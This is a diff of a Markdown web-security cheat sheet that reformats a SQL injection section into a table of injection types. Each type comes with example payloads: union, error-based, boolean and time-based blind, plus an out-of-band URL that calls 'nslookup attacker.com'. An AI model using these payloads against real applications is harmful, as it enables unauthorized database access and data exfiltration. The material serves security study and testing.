@@ -20,63 +20,40 @@
 - SSRF exploit LFI, RFI, or command injection, port scan etc.
 >
 
-### SQL injection and its type:
+### SQL Injection and Its Types
 
-**1. In-band SQL Injection:**
-a) **Union-based SQLi:** Utilizes the SQL UNION operator to combine the results of two or more
-    SELECT queries into a single result set.
-
-```
-' UNION SELECT null--comment
-' UNION SELECT null,nul l--comment
-' UNION SELECT null,null,null--comment
-' UNION SELECT null,null,null,null--comment
-1 UNION SELECT username, password FROM users
-```
-```
-b) Error-based SQLi : Injects SQL code that triggers database errors, revealing information
-about the database structure or contents.
-AND 1=1—
-SELECT 1/0 –
-AND 1=0--
-AND 1=1#
-AND 1=0#
-OR 1=
-OR 1=
-OR x=x
-OR x=y
-```
-**2. Out-of-band SQL Injection:**
-Instead of retrieving data directly through the application, use alternative communication
-methods (such as DNS or HTTP queries) to access the database.
-**3. Blind SQL Injection:**
-a) **Boolean-based Blind SQLi:** Sends SQL queries that result in a true or false response, using
-    conditional statements to extract data.
-    ' OR '
-    ' OR 1 -- -
-    " OR "" = "
-    " OR 1 = 1 -- -
-    ' OR '' = '
-    ' OR 1=1 --
-    ' OR 1=1 AND 'a'='a
-
-```
-b) Time-based Blind SQLi : Introduces time delays in SQL queries to infer information from the
-database based on the application's response time.
-sleep(5)#
-```
-
-```
-" or sleep(5)#
-' or sleep(5)#
-" or sleep(5)="
-' or sleep(5)='
-; WAITFOR DELAY '0:0:10'—
-waitfor delay '00:00:05'
-```
-**4. Second-order SQL Injection:** Second-order SQL injection, also known as stored or persistent SQL injection,
-    is a type of SQL injection attack where the malicious payload is stored within the application's database, and the
-    execution of the payload occurs at a later time when certain conditions are met.
+| **Type**                       | **Sub-Type**                  | **Description**                                                                                      | **Example Commands**                                  |
+|-------------------------------|-------------------------------|------------------------------------------------------------------------------------------------------|-----------------------------------------------------|
+| **In-band SQL Injection**      |                               | Uses the same communication channel for both launching the attack and retrieving results              |                                                     |
+|                                | a) **Union-based SQLi**       | Utilizes the SQL UNION operator to combine the results of multiple SELECT queries into a single result set | `1 UNION SELECT username, password FROM users`     |
+|                                |                               |                                                                                                      | `' UNION SELECT null, null--`                      |
+|                                |                               |                                                                                                      | `' UNION SELECT null, null, null--`               |
+|                                |                               |                                                                                                      | `' UNION SELECT null, null, null, null--`         |
+|                                | b) **Error-based SQLi**       | Injects SQL code that triggers database errors, potentially revealing information about the database schema or contents | `AND 1=1--`                                      |
+|                                |                               |                                                                                                      | `SELECT 1/0--`                                     |
+|                                |                               |                                                                                                      | `AND 1=0--`                                       |
+|                                |                               |                                                                                                      | `AND 1=1#`                                        |
+|                                |                               |                                                                                                      | `AND 1=0#`                                        |
+|                                |                               |                                                                                                      | `OR 1=1`                                          |
+|                                |                               |                                                                                                      | `OR x=x`                                          |
+|                                |                               |                                                                                                      | `OR x=y`                                          |
+| **Blind SQL Injection**        |                               | The attacker does not see the result of the query directly but infers information from the application's responses |                                                     |
+|                                | a) **Boolean-based Blind SQLi** | Sends SQL queries that result in true or false responses to infer data based on the application's behavior | `' OR '1'='1`                                     |
+|                                |                               |                                                                                                      | `' OR 1=1--`                                      |
+|                                |                               |                                                                                                      | `" OR "" = "`                                      |
+|                                |                               |                                                                                                      | `" OR 1 = 1--`                                    |
+|                                |                               |                                                                                                      | `' OR '' = '`                                      |
+|                                |                               |                                                                                                      | `' OR 1=1--`                                      |
+|                                |                               |                                                                                                      | `' OR 1=1 AND 'a'='a`                              |
+|                                | b) **Time-based Blind SQLi**  | Introduces delays in SQL queries to infer data based on the application's response time              | `SLEEP(5)--`                                      |
+|                                |                               |                                                                                                      | `" OR SLEEP(5)--"`                                |
+|                                |                               |                                                                                                      | `' OR SLEEP(5)--`                                  |
+|                                |                               |                                                                                                      | `" OR SLEEP(5) ="`                                 |
+|                                |                               |                                                                                                      | `' OR SLEEP(5) ='`                                 |
+|                                |                               |                                                                                                      | `WAITFOR DELAY '00:00:10'--`                      |
+|                                |                               |                                                                                                      | `WAITFOR DELAY '00:00:05'--`                       |
+| **Out-of-band SQL Injection**  |                               | Uses alternative communication channels (such as DNS or HTTP) to exfiltrate data                      | `http://example.com/somepage.php?id=1; nslookup attacker.com` |
+| **Second-order SQL Injection** |                               | The malicious payload is stored within the application's database and executed later when certain conditions are met | `INSERT INTO users (username, password) VALUES ('test', 'test'); -- The stored payload executes later when the application processes the data` |
 
 
 
